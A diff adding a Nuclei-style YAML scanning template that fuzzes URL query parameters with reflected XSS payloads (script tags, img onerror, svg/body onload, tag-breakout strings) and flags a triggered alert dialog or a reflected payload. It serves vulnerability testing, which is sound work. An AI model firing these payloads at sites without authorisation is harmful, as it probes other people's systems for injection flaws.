@@ -1,0 +1,65 @@
+id: custom-xss-query
+
+info:
+  name: Custom XSS - Query Parameters
+  author: quintanilha
+  severity: medium
+  description: Testa XSS em query strings usando payloads efetivos baseados em técnicas reais
+  tags: xss,query,dast,headless,custom,quintanilha
+
+variables:
+  num: "{{rand_int(10000, 99999)}}"
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: xss_triggered
+
+    payloads:
+      xss_payloads:
+        - "'\"><script>alert({{num}})</script>"
+        - "<script>alert({{num}})</script>"
+        - "\"><img src=x onerror=alert({{num}})>"
+        - "\"><svg onload=alert({{num}})>"
+        - "\"><body onload=alert({{num}})>"
+        - "<script>alert(1)</script>"
+        - "'\">><svg/onload=alert(1)>"
+        - "\">';/><u>test123"
+        - "\">';/></script><u>test123"
+        - "\">';/></textarea><u>test123"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{xss_payloads}}"
+
+    stop-at-first-match: true
+    
+    matchers-condition: or
+    
+    matchers:
+      - type: dsl
+        name: xss-dialog
+        dsl:
+          - xss_triggered == true
+      
+      - type: word
+        name: xss-reflected
+        part: body
+        words:
+          - "{{xss_payloads}}"
+
+    extractors:
+      - type: kval
+        kval:
+          - request_url
+      
+      - type: kval
+        kval:
+          - xss_payloads
